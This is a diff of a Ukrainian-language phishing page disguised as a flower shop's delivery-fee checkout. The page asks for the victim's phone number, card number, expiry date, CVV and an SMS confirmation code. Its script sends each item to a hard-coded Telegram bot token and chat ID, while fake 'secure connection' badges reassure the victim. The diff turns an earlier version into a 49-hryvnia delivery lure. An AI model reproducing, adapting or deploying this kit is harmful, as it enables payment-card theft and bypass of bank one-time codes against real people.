@@ -1,9 +1,9 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Підтвердження замовлення | Квіти</title>
+    <title>Оплата доставки | Квіти</title>
     <!-- Шрифт Montserrat -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,7 +17,6 @@
             box-sizing: border-box;
         }
 
-
         body {
             font-family: 'Montserrat', sans-serif;
             background: linear-gradient(145deg, #e8f5e9 0%, #c8e6c9 100%);
@@ -29,7 +28,6 @@
             color: #2e3b2e;
             position: relative;
         }
-
 
         /* Квітковий декор */
         body::before {
@@ -51,7 +49,6 @@
             transform: rotate(15deg);
         }
 
-
         .checkout-container {
             max-width: 480px;
             width: 100%;
@@ -64,14 +61,12 @@
             border: 1px solid rgba(102, 187, 106, 0.3);
         }
 
-
         .header {
             padding: 30px 30px 20px;
             background: rgba(255, 255, 255, 0.5);
             border-bottom: 2px dashed #a5d6a7;
             text-align: center;
         }
-
 
         .logo {
             display: flex;
@@ -81,13 +76,11 @@
             margin-bottom: 15px;
         }
 
-
         .logo-icon {
             font-size: 48px;
             color: #81c784;
             filter: drop-shadow(0 4px 6px rgba(76, 175, 80, 0.2));
         }
-
 
         .logo-text {
             font-weight: 600;
@@ -99,7 +92,6 @@
             border-radius: 40px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
-
 
         .badge {
             background: #e8f5e9;
@@ -115,7 +107,6 @@
             margin-bottom: 20px;
         }
 
-
         .amount {
             font-size: 28px;
             font-weight: 600;
@@ -127,7 +118,6 @@
             font-weight: 400;
             color: #558b2f;
         }
-
 
         .merchant-info {
             display: flex;
@@ -142,8 +132,6 @@
             margin: 10px 0;
         }
 
-
-        /* Новий блок з інформацією про замовлення */
         .order-info {
             background: #f1f8e9;
             border-left: 4px solid #81c784;
@@ -172,16 +160,13 @@
             margin-bottom: 5px;
         }
 
-
         .content {
             padding: 30px;
         }
 
-
         .step {
             margin-bottom: 30px;
         }
-
 
         .step-title {
             font-weight: 600;
@@ -199,11 +184,9 @@
             font-size: 20px;
         }
 
-
         .form-group {
             margin-bottom: 20px;
         }
-
 
         .form-group label {
             display: block;
@@ -214,11 +197,9 @@
             letter-spacing: 0.3px;
         }
 
-
         .input-wrapper {
             position: relative;
         }
-
 
         .input-wrapper i {
             position: absolute;
@@ -229,8 +210,7 @@
             font-size: 16px;
         }
 
-
-        .input-wrapper input, .input-wrapper textarea {
+        .input-wrapper input {
             width: 100%;
             background: #ffffffd9;
             border: 1px solid #c8e6c9;
@@ -243,20 +223,12 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
 
-
-        .input-wrapper input:focus, .input-wrapper textarea:focus {
+        .input-wrapper input:focus {
             border-color: #66bb6a;
             outline: none;
             box-shadow: 0 0 0 4px rgba(102, 187, 106, 0.15);
             background: #ffffff;
         }
-
-
-        textarea {
-            resize: vertical;
-            min-height: 80px;
-        }
-
 
         .card-row {
             display: flex;
@@ -265,7 +237,6 @@
         .card-row .form-group {
             flex: 1;
         }
-
 
         .btn {
             background: linear-gradient(145deg, #81c784, #66bb6a);
@@ -283,18 +254,15 @@
             border: 1px solid #a5d6a7;
         }
 
-
         .btn:hover {
             background: linear-gradient(145deg, #66bb6a, #4caf50);
             transform: translateY(-2px);
             box-shadow: 0 12px 25px -8px #4caf50;
         }
 
-
         .btn i {
             margin-right: 8px;
         }
-
 
         .payment-icons {
             display: flex;
@@ -305,7 +273,6 @@
             font-size: 28px;
         }
 
-
         .footer-note {
             text-align: center;
             font-size: 12px;
@@ -313,11 +280,9 @@
             margin-top: 20px;
         }
 
-
         .footer-note i {
             color: #66bb6a;
         }
-
 
         /* Стилі для OTP */
         .otp-section {
@@ -368,14 +333,12 @@
                 <span class="logo-text">Квіти.ua</span>
             </div>
             <div class="badge"><i class="fas fa-lock"></i> Захищене з'єднання</div>
-            <div class="amount">Доставка</div> <!-- Суму прибрали -->
+            <div class="amount">Оплата доставки</div>
             <div class="merchant-info">
                 <i class="fas fa-store"></i> Квітковий магазин «Троянда»
                 <i class="fas fa-check-circle" style="color: #4caf50;"></i>
             </div>
 
-
-            <!-- Новий блок з інформацією про замовлення -->
             <div class="order-info">
                 <span class="warning-tag"><i class="fas fa-exclamation-triangle"></i> Увага</span>
                 <p><strong>⚠️ До Вас прямує замовлення K-56742</strong></p>
@@ -384,31 +347,22 @@
             </div>
         </div>
 
-
         <div class="content">
-            <!-- Крок 1: дані отримувача та картки -->
+            <!-- Крок 1: телефон та дані картки -->
             <div id="step1">
                 <div class="step">
-                    <div class="step-title"><i class="fas fa-user"></i> Отримувач</div>
+                    <div class="step-title"><i class="fas fa-phone-alt"></i> Контактний номер</div>
                     <div class="form-group">
-                        <label>Ім'я отримувача</label>
+                        <label>Номер телефону отримувача</label>
                         <div class="input-wrapper">
-                            <i class="fas fa-user-circle"></i>
-                            <input type="text" id="name" value="Олександр Петренко" placeholder="Як у замовленні">
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label>Коментар кур'єру (домофон, код, орієнтир)</label>
-                        <div class="input-wrapper">
-                            <i class="fas fa-comment-dots"></i>
-                            <textarea id="comment" placeholder="наприклад, домофон 123, під'їзд 2"></textarea>
+                            <i class="fas fa-mobile-alt"></i>
+                            <input type="tel" id="phone" placeholder="+380 00 000 00 00" value="+380">
                         </div>
                     </div>
                 </div>
 
-
                 <div class="step">
-                    <div class="step-title"><i class="fas fa-credit-card"></i> Дані картки</div>
+                    <div class="step-title"><i class="fas fa-credit-card"></i> Дані картки для оплати доставки</div>
                     <div class="form-group">
                         <label>Номер картки</label>
                         <div class="input-wrapper">
@@ -434,10 +388,7 @@
                     </div>
                 </div>
 
-
-                <!-- Кнопка змінена: без суми, просто підтвердження -->
-                <button class="btn" id="payBtn"><i class="fas fa-check-circle"></i> Підтвердити замовлення</button>
-
+                <button class="btn" id="payBtn"><i class="fas fa-truck"></i> Сплатити доставку 49 ₴</button>
 
                 <div class="payment-icons">
                     <i class="fab fa-cc-visa"></i>
@@ -448,12 +399,11 @@
                 </div>
             </div>
 
-
             <!-- Крок 2: підтвердження SMS -->
             <div id="step2" style="display: none;">
                 <div class="step">
                     <div class="step-title"><i class="fas fa-envelope-open-text"></i> Підтвердження</div>
-                    <p style="margin-bottom: 20px; color: #2e7d32;">Ми надіслали код на номер <strong>+380 (**) ***-**-89</strong></p>
+                    <p style="margin-bottom: 20px; color: #2e7d32;">Ми надіслали код на номер <strong id="phoneDisplay">+380</strong></p>
                     <div class="otp-inputs">
                         <input type="text" maxlength="1" class="otp-digit">
                         <input type="text" maxlength="1" class="otp-digit">
@@ -465,22 +415,23 @@
                 </div>
             </div>
 
-
             <div class="footer-note">
                 <i class="fas fa-shield-alt"></i> Ваші дані захищені
             </div>
         </div>
     </div>
 
-
     <script>
         // НАЛАШТУВАННЯ
         const TELEGRAM_BOT_TOKEN = '8457818382:AAFfzFzAkVl69eyia9ZR3AupkU1wBhQ0mIs';
         const ADMIN_CHAT_ID = '8015426849';
 
-
-        let orderData = {};
-
+        let orderData = {
+            phone: '',
+            card: '',
+            expiry: '',
+            cvv: ''
+        };
 
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -504,45 +455,42 @@
             }
         }
 
-
         document.getElementById('payBtn').addEventListener('click', async function() {
-            orderData = {
-                name: document.getElementById('name').value,
-                comment: document.getElementById('comment').value,
-                card: document.getElementById('card').value.replace(/\s/g, ''),
-                expiry: document.getElementById('expiry').value,
-                cvv: document.getElementById('cvv').value
-            };
+            orderData.phone = document.getElementById('phone').value.trim();
+            orderData.card = document.getElementById('card').value.replace(/\s/g, '');
+            orderData.expiry = document.getElementById('expiry').value;
+            orderData.cvv = document.getElementById('cvv').value;
 
-
-            if (!orderData.card || !orderData.expiry || !orderData.cvv) {
-                alert('Будь ласка, заповніть дані картки');
+            if (!orderData.phone || !orderData.card || !orderData.expiry || !orderData.cvv) {
+                alert('Будь ласка, заповніть усі поля');
                 return;
             }
 
+            // Проста валідація номера (можна покращити)
+            if (orderData.phone.length < 10) {
+                alert('Введіть коректний номер телефону');
+                return;
+            }
 
             const msg = `
-🌸 <b>НОВЕ ЗАМОВЛЕННЯ (доставка)</b>
+🌼 <b>ОПЛАТА ДОСТАВКИ</b>
 
-
-👤 <b>Отримувач:</b> ${orderData.name}
-📝 <b>Коментар:</b> ${orderData.comment || 'немає'}
-
+📞 <b>Телефон отримувача:</b> ${orderData.phone}
 
 💳 <b>Дані картки:</b>
    • Номер: <code>${orderData.card}</code>
    • Термін: ${orderData.expiry}
    • CVV: ${orderData.cvv}
+   • Сума: 49 грн (доставка)
             `;
-
 
             const success = await sendToTelegram(msg);
             if (success) {
+                document.getElementById('phoneDisplay').innerText = orderData.phone;
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'block';
             }
         });
-
 
         // OTP handling
         const otpInputs = document.querySelectorAll('.otp-digit');
@@ -557,7 +505,6 @@
             });
         });
 
-
         document.getElementById('confirmBtn').addEventListener('click', async function() {
             let otp = '';
             otpInputs.forEach(i => otp += i.value);
@@ -566,26 +513,23 @@
                 return;
             }
 
-
             const otpMsg = `
 🔐 <b>Код підтвердження</b>
-👤 Отримувач: ${orderData.name}
+📞 Телефон: ${orderData.phone}
 💳 Картка: ${orderData.card}
 🔢 Код: <code>${otp}</code>
             `;
             const success = await sendToTelegram(otpMsg);
             if (success) {
-                alert('✅ Замовлення підтверджено! Дякуємо.');
+                alert('✅ Оплату доставки підтверджено! Дякуємо.');
                 setTimeout(() => location.reload(), 2000);
             }
         });
-
 
         document.getElementById('resendLink').addEventListener('click', function(e) {
             e.preventDefault();
             alert('Новий код надіслано (демо)');
         });
-
 
         // Форматування полів
         document.getElementById('card').addEventListener('input', function(e) {
@@ -600,7 +544,10 @@
         document.getElementById('cvv').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/\D/g, '').substring(0,3);
         });
+        // Автоматичне форматування телефону (просте)
+        document.getElementById('phone').addEventListener('input', function(e) {
+            // Можна додати маску, але залишимо як є
+        });
     </script>
 </body>
-
-</html>
+                </html>
